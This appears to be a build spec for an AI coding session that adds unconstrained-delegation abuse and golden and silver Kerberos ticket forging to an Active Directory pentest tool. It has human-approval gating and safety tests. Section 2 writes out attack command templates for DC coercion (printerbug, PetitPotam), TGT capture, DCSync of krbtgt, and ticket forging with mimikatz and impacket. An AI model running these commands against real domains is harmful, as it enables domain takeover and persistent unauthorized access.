# Build spec — Unconstrained delegation edge + ticket forging (`:ad` extension)

**Status:** ready to execute in a fresh session. **Author:** planning session, 2026-08-07.
**One line:** finish the Kerberos-delegation family — add the missing **unconstrained delegation** abusable edge (`TrustedForDelegation` → coerce a DC → capture its TGT → domain compromise) to the AD graph, and add **golden / silver ticket** forging as post-compromise persistence techniques. RBCD and constrained/S4U are already full edges; unconstrained is the one delegation primitive not yet routable, and ticket forging exists only as a mimikatz arsenal capability with no technique node.

---

## 0. Guiding constraint (read first, do not weaken)

Adds **NO new gate.** Per-command human approval is the only bound. Keep it **maximally open / offensive**: real coercion (printerbug / PetitPotam / Coercer) against a real DC, real TGT capture, real golden/silver ticket minting — all through **approve-each**. The graph **proposes an edge index, never authors a command** — copy `adgraph/orchestrator.py` exactly. Ticket forging is offered as a **propose-only technique on the relevant node**, never auto-run. No autonomy.

## 1. Read-first (RBCD/S4U are the template — this mirrors them)

- `backend/adgraph/schema.py` — `ABUSABLE_EDGES` already has `AddAllowedToAct` (RBCD), `AllowedToDelegate` (constrained/S4U), `AllowedToAct` (RBCD-on-target), `AdminTo`. You add `TrustedForDelegation`. Note `AdminTo` is how the walk reaches the delegation host first.
- `backend/adgraph/parser.py` — BloodHound emits `unconstraineddelegation: true` on computers/users (and `TrustedToAuth` for constrained). Synthesize a `TrustedForDelegation` edge from that flag (mirror how RBCD/`AllowedToAct` is parsed from `msDS-AllowedToActOnBehalfOfOtherIdentity`).
- `backend/adgraph/techniques.py` — study the RBCD entry (`impacket-rbcd` + `Rubeus.exe s4u`) and the constrained-delegation entry; the unconstrained technique mirrors their shape (Rubeus monitor + a coercion source). `AbuseSpec` has `win_template` — the Rubeus/mimikatz path goes there.
- `backend/adgraph/orchestrator.py` — unchanged; BFS routes `owned → …(AdminTo)→ delegation-host → (TrustedForDelegation) → domain` once the edge exists.
- `backend/cockpit/allowlist.py` — coercion tools (`petitpotam`, `printerbug`, `coercer`, `dfscoerce`, `shadowcoerce`) are **already classified** as directory-mutating/relay (gated). Reuse; nothing to add there.
- `backend/arsenal/tools.json` — `mimikatz` (golden ticket listed), Rubeus, impacket (`ticketer.py`) are **present**. No new tool required.
- Memory: **attack-step schema lives in 3 files**; **cockpit/arsenal decoupling**; golden/silver are **persistence (post-DA)** — keep them out of the route-to-DA BFS as *techniques*, not routing edges.

## 2. What to build

### 2a. Unconstrained delegation edge (`adgraph/schema.py` + `parser.py`)
Add `TrustedForDelegation` to `ABUSABLE_EDGES` (rank it among the delegation edges). Parser: for any computer/user with `unconstraineddelegation: true`, synthesize `that-host --TrustedForDelegation--> domain` (the win = capturing a DC TGT ⇒ DCSync ⇒ full compromise). Carry in `edge.props`: whether it's a DC (already game over), and that the abuse **requires owning the host first** (the BFS supplies that via `AdminTo`).

### 2b. Unconstrained technique (`adgraph/techniques.py`)
`AbuseSpec` for `TrustedForDelegation`, `destructive=True`:
- **summary:** "Own {source} (unconstrained delegation), coerce {dc} to authenticate to it, capture its TGT, then DCSync."
- **template (Linux, from Kali):** run `impacket` monitor equivalent + coerce, e.g. start a capture (`krbrelayx.py`/`Rubeus` on the host) then `python3 printerbug.py '{domain}/{source_sam}:<PASSWORD>@{dc}' {attacker_host}` or `python3 PetitPotam.py {attacker_host} {dc}` → captured TGT → `secretsdump.py -k` / DCSync.
- **win_template (on the host, CRTP way):** `Rubeus.exe monitor /interval:1 /nowrap` + `SpoolSample.exe {dc} {source_host}` → `Rubeus.exe ptt /ticket:<b64>` → `mimikatz lsadump::dcsync /domain:{domain} /user:krbtgt`.
- KB-seed: "unconstrained delegation printerbug petitpotam TGT capture Rubeus monitor DCSync".

### 2c. Ticket forging techniques (persistence — technique nodes, not routing edges)
Surface two propose-only techniques on the relevant nodes (offered once the required secret is held; do **not** invent a routing edge):
- **Golden ticket** — offered on the **domain** node once `krbtgt` is compromised (i.e. after a `DCSync` step). `AbuseSpec`-style entry:
  - Linux: `impacket-ticketer -nthash <krbtgt-hash> -domain-sid <sid> -domain {domain} administrator` → `KRB5CCNAME=administrator.ccache impacket-psexec -k -no-pass {domain}/administrator@{dc}`.
  - Win: `mimikatz kerberos::golden /user:administrator /domain:{domain} /sid:<sid> /krbtgt:<hash> /ptt`.
- **Silver ticket** — offered on a **computer/service** node once that service account's hash is held:
  - `impacket-ticketer -nthash <service-hash> -domain-sid <sid> -domain {domain} -spn <spn> administrator`.
  - Win: `mimikatz kerberos::golden /sid:<sid> /domain:{domain} /target:{host} /service:cifs /rc4:<hash> /user:administrator /ptt`.

Implementation choice (pick the lighter one, note it in the PR): either (a) a small **persistence-actions catalog** keyed by node type that the `/cockpit/ad` orchestrator panel surfaces at the goal/service node, or (b) non-traversable `GoldenTicket`/`SilverTicket` self-edges the UI renders but `paths.py` never walks (add them to `STRUCTURAL_EDGES` so BFS ignores them). Both keep forging **propose-only** and out of the route-to-DA search.

### 2d. Frontend — `/cockpit/ad`
`TrustedForDelegation` renders as a normal abusable edge in the route. Golden/silver appear as **persistence actions** on their node (a distinct, non-route styling so they don't read as a routing step). `hp-tn-*` classes. **Look at the screen.**

## 3. Tests
- `backend/test_deleg_tickets.py` — parser: a BloodHound fixture with `unconstraineddelegation:true` → a `TrustedForDelegation` edge; routing: `owned → AdminTo host → TrustedForDelegation → domain` produces a path; the technique has a Linux template + a `win_template`. Ticket forging: golden offered on `domain` only after a DCSync/krbtgt-held state; silver offered on a service node with a held hash; **neither is traversed by `paths.py`**.
- Extend `backend/test_adorch_safety.py` — orchestrator picks an index, never authors a command; a pick outside the frontier refused; ticket-forging techniques never enter the BFS frontier; module executes nothing (AST). Add to `run_safety_tests.sh`.

## 4. Acceptance criteria
- A host with unconstrained delegation routes to `domain` via `TrustedForDelegation`; the orchestrator proposes the edge index; approving the coerce+capture commands runs them via the executor; `advance` on approved exit-0.
- Golden + silver ticket forging are selectable **persistence** techniques on the right nodes, gated behind holding the required secret, never part of the route-to-DA path search.
- Steps land as `Finding`s in engagement state.
- `run_safety_tests.sh` green; `next build` exits 0; screen looked at; assessment + README updated (same commit).

## 5. Assumptions (flip any)
- Unconstrained delegation is the must-have (it's the missing routable edge). Golden/silver are the "do everything" additions — persistence techniques, explicitly **not** routing edges, because a route-to-DA graph shouldn't search through post-DA persistence.
- Coercion tooling is already gated in `allowlist.py`; no allowlist changes.
- No new tools (mimikatz/Rubeus/impacket/printerbug/PetitPotam all present).

---

## 6. README + screenshot + assessment (do this exactly like prior sessions)

**Not done until the README + a real screenshot ship with it.** Screen route: **`/cockpit/ad`**.

- **Capture a real lab-state screenshot** with headless Edge (`headless-edge-screenshots`), app running, **synthetic** data only (no real domain/DC/host names):
  ```
  EDGE="/c/Program Files (x86)/Microsoft/Edge/Application/msedge.exe"
  "$EDGE" --headless=new --disable-gpu --hide-scrollbars --force-device-scale-factor=1 \
    --user-data-dir=<tmp-profile> --window-size=1440,950 --virtual-time-budget=8000 \
    --screenshot=out.png "http://localhost:3000/cockpit/ad"
  ```
  **View it** — confirm a `TrustedForDelegation` route + the golden/silver persistence actions render (not blank/error). Deep-link the sample if needed.
- **Add the screenshot** to `assets/screenshots/` (next free number); commit it.
- **Add a concise README feature section** (existing voice) + a "What you get, at a glance" row: unconstrained delegation + ticket forging.
- **Update `docs/ASSESSMENT-2026-07-26.md`** + regenerate html/pdf (`python docs/build-assessment.py`) in the **same commit** (`keep-assessment-current`; verify against the html).
- **Look at the screen** (`frontend-class-vocabulary`): `hp-tn-*`, never a bare `hp-card`.
